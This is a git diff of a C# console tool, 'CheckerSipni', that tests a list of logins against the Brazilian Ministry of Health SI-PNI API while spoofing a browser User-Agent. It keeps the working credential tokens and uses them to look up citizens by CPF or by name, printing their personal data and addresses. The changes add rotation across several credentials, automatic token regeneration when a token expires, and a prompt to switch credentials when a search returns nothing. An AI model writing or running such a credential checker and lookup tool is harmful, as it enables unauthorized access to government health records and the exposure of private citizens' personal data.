@@ -6,18 +6,19 @@
 
 using System.Net.Http.Headers;
 using System.Text;
-using System.Text.Encodings.Web;
 using System.Text.Json;
 using System.Web;
-using System.Linq;
 using static CheckerSipni.Models.RespostasModel;
-using System.Globalization;
-using CsvHelper;
+using Lolcat;
 
 namespace CheckerSipni
 {
     class Program
     {
+        static string tokensFilePath = "tokens.txt";
+        static string loginsFilePath = "logins.txt";
+        static RainbowStyle style = new RainbowStyle();
+        static Rainbow rainbow = new Rainbow(style);
         static string APITOKEN = "https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso";
         static string APICONSULTACPF = "https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao/cpf";
         static HttpClient Client = new HttpClient();
@@ -34,80 +35,18 @@ Versao do SI-PNI para sistemas sem interface grafica
         static async Task Main()
         {
             Console.Clear();
-            Console.WriteLine("[*] Gerando token valido...");
-            var tokenValido = await GerarTokenValido();
+            rainbow.WriteLineWithMarkup(ASCIIART);
 
-            while (true)
+            var tokens = new List<CredentialToken>();
+            if (!File.Exists("tokens.txt") || File.ReadAllLines(tokensFilePath).Length == 0)
             {
-                Console.Clear();
-                Console.ForegroundColor = ConsoleColor.Blue;
-                Console.WriteLine(ASCIIART);
-                Console.ResetColor();
-
-                // Isso está ridículo, mas blz kkkk
-                Console.WriteLine("======== MENU ========");
-                Console.WriteLine("1. Consulta por Nome");
-                Console.WriteLine("2. Consulta por CPF");
-                Console.WriteLine("3. Ver codigos de municipios");
-                Console.WriteLine("0. Sair");
-                Console.WriteLine("======================");
-                Console.Write("Escolha uma opção: ");
-                var option = int.Parse(Console.ReadLine());
-
-                // memento júnior
-                switch (option)
-                {
-                    case 1:
-                        Console.WriteLine("Nome: ");
-                        var nome = Console.ReadLine();
-                        Console.WriteLine("Codigo Municipio: ");
-                        var codMun = Console.ReadLine();
-                        if (codMun.Length == 7)
-                        {
-                            codMun = codMun.Substring(0, codMun.Length - 1);
-                        }
-
-                        Console.WriteLine("[*] Buscando dados...");
-                        if (!string.IsNullOrEmpty(nome.Trim()) && !string.IsNullOrEmpty(codMun.Trim()))
-                        {
-
-                            var resNome = await ConsultaNome(tokenValido, nome, codMun);
-                            Resultado(resNome);
-                            Console.WriteLine("Tecle enter para voltar...");
-                            Console.ReadLine();
-                        }
-                        else
-                        {
-                            Console.WriteLine("Esta faltando coisa ai amigo...");
-                            Console.ReadLine();
-                        }
-                        break;
-                    case 2:
-                        Console.WriteLine("CPF: ");
-                        var cpf = Console.ReadLine();
-                        Console.WriteLine("[*] Buscando dados...");
-                        var resCpf = await ConsultaCPF(tokenValido, cpf);
-                        Resultado(resCpf);
-                        Console.WriteLine("Tecle enter para voltar...");
-                        Console.ReadLine();
-                        break;
-                    case 3:
-                        Console.WriteLine("Pesquise o código do seu municipio na tabela.");
-                        Console.WriteLine("Tecle enter para voltar...");
-                        Console.ReadLine();
-                        break;
-                    case 0:
-                        Environment.Exit(0);
-                        break;
-                    default:
-                        Console.WriteLine("Opçao invalida");
-                        Console.ReadLine();
-                        break;
-                }
+                rainbow.WriteLineWithMarkup("[*] Arquivo 'tokens.txt'. Checando logins e gerando token valido...");
+                tokens = await GerarTokenValido();
             }
+
+            await Menu(tokens);
         }
 
-        // Exibe os dados após a consulta
         static void Resultado(Root dados)
         {
             if (dados != null && dados.records != null && dados.records.Count > 0)
@@ -124,40 +63,120 @@ Versao do SI-PNI para sistemas sem interface grafica
                     Console.WriteLine($"ENDEREÇO: UF = {dado.endereco?.siglaUf ?? "N/A"}, BAIRRO = {dado.endereco?.bairro ?? "N/A"}, NUMERO = {dado.endereco?.numero ?? "N/A"}, CEP = {dado.endereco?.cep ?? "N/A"}, COMPLEMENTO = {dado.endereco?.complemento ?? "N/A"}");
                     Console.WriteLine("=====================================\n");
                 }
-
-                return;
             }
             else
             {
                 Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine("[!] ATENCAO: Nenhum dado encontrado.\n");
+                Console.WriteLine("[!] ATENCAO: Nenhum dado encontrado. Tente mudar de credencial.\n");
             }
         }
 
-        // Gerar Token para realizar a consulta sem erro de 401
-        static async Task<string> GerarTokenValido()
+        static async Task Menu(List<CredentialToken> credentialTokens)
         {
-            var loginsFilePath = @"logins.txt";
+            if (credentialTokens.Count == 0)
+            {
+                var tokensLines = File.ReadAllLines(tokensFilePath);
+                credentialTokens.AddRange(tokensLines.Select(line =>
+                {
+                    var parts = line.Split(":");
+                    return new CredentialToken(parts[0], parts[2]);
+                }));
+            }
+
+            while (true)
+            {
+                Console.Clear();
+                rainbow.WriteLineWithMarkup(ASCIIART);
+                Console.WriteLine("======== MENU ========");
+                Console.WriteLine("1. Consulta por Nome");
+                Console.WriteLine("2. Consulta por CPF");
+                Console.WriteLine("0. Sair");
+                Console.WriteLine("======================");
+                Console.Write("Escolha uma opção: ");
+
+                if (int.TryParse(Console.ReadLine(), out int option))
+                {
+                    switch (option)
+                    {
+                        case 1:
+
+                            Console.WriteLine("Escolha uma credencial:");
+                            for (int i = 0; i < credentialTokens.Count; i++)
+                            {
+                                rainbow.WriteLineWithMarkup($"{i + 1}. {credentialTokens[i].Credential}");
+                            }
+                            Console.Write("Selecionar credencial: ");
+                            if (int.TryParse(Console.ReadLine(), out int index) && index > 0 && index <= credentialTokens.Count)
+                            {
+                                var token = credentialTokens[index - 1].Token;
+                                await ConsultaPorNome(token);
+                            }
+                            else
+                            {
+                                Console.WriteLine("Credencial invalida.");
+                            }
+                            break;
+                        case 2:
+                            Console.WriteLine("Escolha uma credencial:");
+                            for (int i = 0; i < credentialTokens.Count; i++)
+                            {
+                                rainbow.WriteLineWithMarkup($"{i + 1}. {credentialTokens[i].Credential}");
+                            }
+                            Console.Write("Selecionar credencial: ");
+                            if (int.TryParse(Console.ReadLine(), out index) && index > 0 && index <= credentialTokens.Count)
+                            {
+                                var token = credentialTokens[index - 1].Token;
+                                await ConsultaPorCPF(token);
+                            }
+                            else
+                            {
+                                Console.WriteLine("Credencial invalida.");
+                            }
+                            break;
+                        case 0:
+                            Environment.Exit(0);
+                            break;
+                        default:
+                            Console.WriteLine("Opcao invalida.");
+                            break;
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("Entrada invalida, tente novamente.");
+                }
+                Console.WriteLine("Tecle enter para voltar...");
+                Console.ReadLine();
+            }
+        }
+
+        static async Task<List<CredentialToken>> GerarTokenValido()
+        {
             var lines = File.ReadLines(loginsFilePath);
-            string validToken = "";
+            var credentialTokens = new List<CredentialToken>();
+
             foreach (var credential in lines)
             {
-                validToken = await CheckLogins(new List<string> { credential });
+                var token = await CheckLogins(new List<string> { credential });
+                if (!string.IsNullOrWhiteSpace(token))
+                {
+                    File.AppendAllText(tokensFilePath, $"{credential}:{token}{Environment.NewLine}");
+                    credentialTokens.Add(new CredentialToken(credential, token));
+                }
             }
 
-            return validToken;
+            return credentialTokens;
         }
 
-        // Checar se os logins.txt estão válidos
         static async Task<string> CheckLogins(List<string> credentials)
         {
-            try
+            foreach (var credential in credentials)
             {
-                foreach (var credential in credentials)
+                try
                 {
                     Client.DefaultRequestHeaders.Clear();
                     var loginBytes = Encoding.ASCII.GetBytes(credential);
-                    var encodedLogin = System.Convert.ToBase64String(loginBytes);
+                    var encodedLogin = Convert.ToBase64String(loginBytes);
 
                     Client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71");
                     Client.DefaultRequestHeaders.Add("X-Authorization", $"Basic {encodedLogin}");
@@ -166,24 +185,49 @@ Versao do SI-PNI para sistemas sem interface grafica
                     var json = await response.Content.ReadAsStringAsync();
                     if (response.IsSuccessStatusCode)
                     {
-                        // pegar accessToken
+                        rainbow.WriteLineWithMarkup($"[ONLINE] {credential}");
                         LoginToken logintoken = JsonSerializer.Deserialize<LoginToken>(json);
                         return logintoken.accessToken;
                     }
+                    else
+                    {
+                        rainbow.WriteLineWithMarkup($"[OFFLINE] {credential}");
+                    }
                 }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[-] ERRO: {ex.Message}");
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[-] ERRO: {ex.Message}");
+                }
             }
 
             return string.Empty;
         }
 
-        /*
-        * AS FUNÇÕES DE CONSULTA LOGO ABAIXO, FAZEM O SEGUINTE
-        * Requisição na API com o token Bearer e retorna a classe com os dados deserializados
-        */
+        static async Task ConsultaPorNome(string tokenValido)
+        {
+            Console.Write("Nome: ");
+            var nome = Console.ReadLine();
+            Console.Write("Codigo Municipio: ");
+            var codMun = Console.ReadLine();
+
+            if (codMun.Length == 7)
+            {
+                codMun = codMun.Substring(0, codMun.Length - 1);
+            }
+
+            if (!string.IsNullOrWhiteSpace(nome) && !string.IsNullOrWhiteSpace(codMun))
+            {
+                Console.WriteLine("[*] Buscando dados...");
+                var resultado = await ConsultaNome(tokenValido, nome, codMun);
+                Resultado(resultado);
+            }
+            else
+            {
+                Console.WriteLine("Nome ou codigo do municipio nao pode estar vazio.");
+                Console.ReadLine();
+            }
+        }
+
         static async Task<Root> ConsultaNome(string bearerToken, string nome, string codMun)
         {
             try
@@ -194,6 +238,12 @@ Versao do SI-PNI para sistemas sem interface grafica
 
                 nome = HttpUtility.UrlEncode(nome);
                 var response = await Client.GetAsync($"https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao?nome={nome}&municipioNascimento={codMun}");
+                if ((int)response.StatusCode == 401)
+                {
+                    rainbow.WriteLineWithMarkup("[*] Tokens expirados, gerando tokens novos...");
+                    await GerarTokenValido();
+                    return null;
+                }
                 var json = await response.Content.ReadAsStringAsync();
                 Root root = JsonSerializer.Deserialize<Root>(json);
 
@@ -206,6 +256,23 @@ Versao do SI-PNI para sistemas sem interface grafica
             }
         }
 
+        static async Task ConsultaPorCPF(string tokenValido)
+        {
+            Console.Write("CPF: ");
+            var cpf = Console.ReadLine();
+            if (!string.IsNullOrWhiteSpace(cpf))
+            {
+                Console.WriteLine("[*] Buscando dados...");
+                var resultado = await ConsultaCPF(tokenValido, cpf);
+                Resultado(resultado);
+            }
+            else
+            {
+                Console.WriteLine("O cpf nao pode estar vazio.");
+                Console.ReadLine();
+            }
+        }
+
         static async Task<Root> ConsultaCPF(string bearerToken, string cpf)
         {
             try
@@ -215,6 +282,13 @@ Versao do SI-PNI para sistemas sem interface grafica
                 Client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", bearerToken);
 
                 var response = await Client.GetAsync($"{APICONSULTACPF}/{cpf}");
+                if ((int)response.StatusCode == 401)
+                {
+                    rainbow.WriteLineWithMarkup("[*] Tokens expirados, gerando tokens novos...");
+                    await GerarTokenValido();
+                    return null;
+                }
+
                 var json = await response.Content.ReadAsStringAsync();
                 Root root = JsonSerializer.Deserialize<Root>(json);
 
